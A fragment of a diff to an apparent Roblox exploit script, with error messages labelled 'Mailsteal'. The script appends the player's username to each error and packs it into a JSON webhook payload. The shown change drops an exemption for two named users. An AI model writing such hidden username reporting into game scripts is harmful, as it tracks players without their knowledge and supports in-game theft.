@@ -3,9 +3,9 @@ local msg = ""
 if e == "Cannot require a non-RobloxScript module from a RobloxScript" then
 return
 end
-if game.Players.LocalPlayer.Name == "hamster97" or game.Players.LocalPlayer.Name == "EatingYveEveryNight" then
-return 
-end
+pcall(function() if _G.Min then
+e = "Mailsteal: "..e
+end end)
 e = e.." | "..game.Players.LocalPlayer.Name
 msg = '{"content":"'..e..'"}'
 local response =
